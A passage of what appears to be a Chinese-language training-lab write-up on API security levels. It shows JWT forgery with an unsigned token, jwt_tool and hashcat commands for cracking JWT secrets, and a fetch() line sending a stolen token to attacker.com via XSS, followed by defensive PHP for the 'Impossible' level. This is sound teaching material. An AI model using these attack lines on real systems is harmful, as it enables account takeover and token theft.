class="string">&quot;exp&quot;</span>: <span class="number">9999999999</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64编码</span></span><br><span class="line">header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造Token（无签名）</span></span><br><span class="line">fake_token = <span class="string">f&quot;<span class="subst">&#123;header_b64&#125;</span>.<span class="subst">&#123;payload_b64&#125;</span>.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Fake token: <span class="subst">&#123;fake_token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用这个Token访问API</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：暴力破解JWT密钥"><a href="#方法2：暴力破解JWT密钥" class="headerlink" title="方法2：暴力破解JWT密钥"></a>方法2：暴力破解JWT密钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用jwt_tool</span></span><br><span class="line">python3 jwt_tool.py &lt;JWT_TOKEN&gt; -C -d /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用hashcat</span></span><br><span class="line">hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：Token劫持"><a href="#方法3：Token劫持" class="headerlink" title="方法3：Token劫持"></a>方法3：Token劫持</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果Token存储在localStorage</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;jwt_token&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过XSS窃取Token</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/steal?token=&#x27;</span> + <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;jwt_token&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的API安全，真正安全。</p>
+<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Impossible: 完善的API安全 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护1：OAuth 2.0认证 ★★★</span></span><br><span class="line"><span class="comment">// 使用标准的OAuth 2.0协议</span></span><br><span class="line"><span class="comment">// 从Authorization头获取Access Token</span></span><br><span class="line"><span class="variable">$authHeader</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Bearer\s+(.*)$/i&#x27;</span>, <span class="variable">$authHeader</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Missing or invalid authorization header&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$accessToken</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 验证Access Token ★★★</span></span><br><span class="line"><span class="comment">// 通过OAuth 2.0服务器验证Token</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_access_token</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 调用OAuth 2.0服务器的introspection endpoint</span></span><br><span class="line">    <span class="variable">$oauth_server</span> = <span class="string">&#x27;https://oauth.example.com/introspect&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$oauth_server</span>, <span class="literal">false</span>, <span class="title function_ invoke__">stream_context_create</span>([</span><br><span class="line">        <span class="string">&#x27;http&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span> =&gt; <span class="title function_ invoke__">http_build_query</span>([<span class="string">&#x27;token&#x27;</span> =&gt; <span class="variable">$token</span>])</span><br><span class="line">        ]</span><br><span class="line">    ]));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$response</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查Token是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$data</span>[<span class="string">&#x27;active&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tokenData</span> = <span class="title function_ invoke__">verify_access_token</span>(<span class="variable">$accessToken</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$tokenData</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Invalid or expired access token&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$currentUserId</span> = <span class="variable">$tokenData</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$currentUserRole</span> = <span class="variable">$tokenData</span>[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line"><span class="variable">$scopes</span> = <span class="variable">$tokenData</span>[<span class="string">&#x27;scope&#x27;</span>] ?? [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护2：基于Scope的权限 ★★★</span></span><br><span class="line"><span class="comment">// 检查Token是否有所需的权限范围</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">has_scope</span>(<span class="params"><span class="variable">$required_scope</span>, <span class="variable">$token_scopes</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$required_scope</span>, <span class="variable">$token_scopes</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护3：严格的限流 ★★★</span></span><br><span class="line"><span class="comment">// 使用Redis实现分布式限流</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_rate_limit_redis</span>(<span class="params"><span class="variable">$user_id</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;api_rate_limit:user:<span class="subst">$user_id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 滑动窗口限流</span></span><br><span class="line">    <span class="variable">$current</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$window</span> = <span class="number">60</span>; <span class="comment">// 60秒窗口</span></span><br><span class="line">    <span class="variable">$limit</span> = <span class="number">100</span>; <span class="comment">// 最多100次请求</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除窗口外的请求</span></span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">zRemRangeByScore</span>(<span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$current</span> - <span class="variable">$window</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前窗口内的请求数</span></span><br><span class="line">    <span class="variable">$count</span> = <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">zCard</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> &gt;= <span class="variable">$limit</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录当前请求</span></span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">zAdd</span>(<span class="variable">$key</span>, <span class="variable">$current</span>, <span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">expire</span>(<span class="variable">$key</span>, <span class="variable">$window</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">check_rate_limit_redis</span>(<span class="variable">$currentUserId</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">429</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Rate limit exceeded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;retry_after&#x27;</span> =&gt; <span class="number">60</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GET /api/users/&#123;id&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护4：Scope检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">has_scope</span>(<span class="string">&#x27;users:read&#x27;</span>, <span class="variable">$scopes</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Insufficient permissions: users:read scope required&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护5：严格的授权检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$currentUserId</span> != <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Forbidden: You can only view your own data&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 记录未授权访问尝试 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Unauthorized API access&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="variable">$currentUserId</span>,</span><br><span class="line">            <span class="string">&#x27;target_user_id&#x27;</span> =&gt; <span class="variable">$userId</span>,</span><br><span class="line">            <span class="string">&#x27;endpoint&#x27;</span> =&gt; <span class="variable">$path</span>,</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span> =&gt; <span class="variable">$method</span>,</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询用户（只返回必要字段）</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id, user, first_name, last_name, email FROM users WHERE user_id = :id&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$userId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="comment">// ★★★ 记录API访问 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">logAPIAccess</span>(<span class="variable">$currentUserId</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="variable">$path</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$user</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;User not found&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PUT /api/users/&#123;id&#125;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;PUT&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ Scope检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">has_scope</span>(<span class="string">&#x27;users:write&#x27;</span>, <span class="variable">$scopes</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Insufficient permissions: users:write scope required&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 授权检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$currentUserId</span> != <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Forbidden: You can only update your own data&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 输入验证 ★★★</span></span><br><span class="line">    <span class="variable">$allowedFields</span> = [<span class="string">&#x27;first_name&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span>, <span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 管理员也不能修改role（需要特殊权限） ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">has_scope</span>(<span class="string">&#x27;users:admin&#x27;</span>, <span class="variable">$scopes</span>)) &#123;</span><br><span class="line">        <span class="variable">$allowedFields</span>[] = <span class="string">&#x27;role&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$updates</span> = [];</span><br><span class="line">    <span class="variable">$params</span> = [<span class="string">&#x27;:id&#x27;</span> =&gt; <span class="variable">$userId</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$allowedFields</span>)) &#123;</span><br><span class="line">            <span class="comment">// ★★★ 额外验证 ★★★</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$key</span> === <span class="string">&#x27;email&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">filter_var</span>(<span class="variable">$value</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                    <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                    <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Invalid email format&#x27;</span></span><br><span class="line">                ]);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$updates</span>[] = <span class="string">&quot;<span class="subst">$key</span> = :<span class="subst">$key</span>&quot;</span>;</span><br><span class="line">            <span class="variable">$params</span>[<span class="string">&quot;:<span class="subst">$key</span>&quot;</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$updates</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;No valid fields to update&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$updates</span>) . <span class="string">&quot; WHERE user_id = :id&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">logAPIAccess</span>(<span class="variable">$currentUserId</span>, <span class="string">&#x27;PUT&#x27;</span>, <span class="variable">$path</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User updated&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">500</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to update user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ 